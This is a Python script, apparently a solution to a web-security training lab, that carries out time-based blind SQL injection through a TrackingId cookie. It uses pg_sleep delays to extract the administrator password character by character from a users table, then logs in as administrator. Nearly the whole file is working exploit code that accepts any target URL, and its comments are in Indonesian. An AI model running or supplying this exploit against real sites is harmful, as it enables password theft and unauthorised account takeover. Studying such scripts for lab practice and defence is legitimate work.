#!/usr/bin/python3

import sys
import httpx
import argparse
import urllib
from bs4 import BeautifulSoup

def sqli_password(url, client):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = f"' || (select case when (username='administrator' and ascii(substring(password,{i},1))='{j}') then pg_sleep(10) else pg_sleep(0) end from users)--"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                'TrackingId': 'vQXmiPbW14BQqrMq' + sqli_payload_encoded,
                'session': '7aoarb8y1t7zFkwCYrB5i68bxp6yhtee'
            }
            try:
                # TAMBAHKAN timeout yang lebih panjang (15 detik)
                r = client.get(url, cookies=cookies, timeout=15.0)
                
                # PERBAIKI: Cek waktu respon, bukan status code 500
                # Karena ini time-based injection, kita cek apakah response > 9 detik
                if r.elapsed.total_seconds() > 9:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break  # Hentikan loop char setelah menemukan yang benar
                else:
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()
            except httpx.TimeoutException:
                # Timeout berarti kemungkinan delay 10 detik berhasil
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            except Exception as e:
                print(f"\n[!] Request error at position {i}, char {j}: {e}")
                print("[*] Retrying...")
                continue

    print(f"\n[+] Password extracted: {password_extracted}")
    return password_extracted

def get_csrf_token(sess, url):
    path_login = "/login"
    response = sess.get(url + path_login, timeout=10.0)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def login_as_an_administrator(sess, url, password_extracted):
    csrf = get_csrf_token(sess, url)
    path_login = "/login"
    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": password_extracted
    }
    response = sess.post(url + path_login, data=data, timeout=10.0)
    if "Log out" in response.text:
        return True
    else:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Blind SQL injection with conditional responses")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxy_url = None
    if args.proxy:
        proxy_url = args.proxy
        print(f"[*] Using Proxy: {args.proxy}")

    print(f"[*] Retrieving administrator password...")

    # PERBAIKI: Gunakan HTTP/1.1 (bukan HTTP/2) untuk menghindari error
    with httpx.Client(
        proxy=proxy_url,
        verify=False,
        http2=False,  # Ubah ke False untuk menggunakan HTTP/1.1
        follow_redirects=True,
        timeout=httpx.Timeout(15.0, connect=10.0)  # Timeout global
    ) as client:
        password_extracted = sqli_password(args.url.strip(), client)

    # login as an administrator
    print(f"[*] Attempting to login as Administrator")
    with httpx.Client(
        proxy=proxy_url,
        verify=False,
        http2=False,  # Ubah ke False
        follow_redirects=True,
        timeout=httpx.Timeout(15.0, connect=10.0)
    ) as sess:
        if login_as_an_administrator(sess, args.url.strip(), password_extracted):
            print(f"[+] Success Take Administrator's Page")
        else:
            print(f"[-] Failed Get an Administrator's Page")